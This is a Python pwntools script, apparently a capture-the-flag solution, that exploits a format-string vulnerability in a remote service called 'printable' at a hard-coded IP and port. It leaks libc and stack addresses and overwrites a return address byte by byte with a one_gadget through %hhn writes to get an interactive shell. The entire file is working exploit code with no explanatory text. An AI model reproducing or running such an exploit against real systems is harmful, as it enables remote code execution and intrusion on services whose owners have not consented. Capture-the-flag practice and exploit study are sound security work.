from pwn import *
import time

ip = "140.110.112.77"
port = 4005

r = remote(ip, port)
# r = process("./printable")

context.arch = "amd64"

def Send(data):
    r.sendline(data.ljust(0x30 - 1, 'a'))
    time.sleep(0.1)

Send("%10$p.%12$p.")
out = r.recvline()[:-1].split(b'.')
libc = int(out[0], 16) - 0x21b97
log.info(hex(libc))
ret = int(out[1], 16) - 240 + 0x10
log.info(hex(ret))

one = libc + 0x4f322

# 12 -> 38

def Write1(off, data):
    if data == 0:
        data = 256
    Send("%{}c%{}$hhn".format(int(data), off))

def Next(n):
    Send("%{}c%12$hhn".format((addr & 0xff) + n))

def Set(data):
    for i in range(8):
        Next(i)
        Write1(38, data & 0xff)
        data >>= 8
    Next(0)

Send("%{}c%12$hn".format((ret & 0xffff)))
addr = ret
Set(one)
Send("%{}c%12$hn".format((ret + 0x40 & 0xffff)))
addr = ret + 0x48
Set(0)

time.sleep(0.1)
r.sendline("exit")

r.interactive()
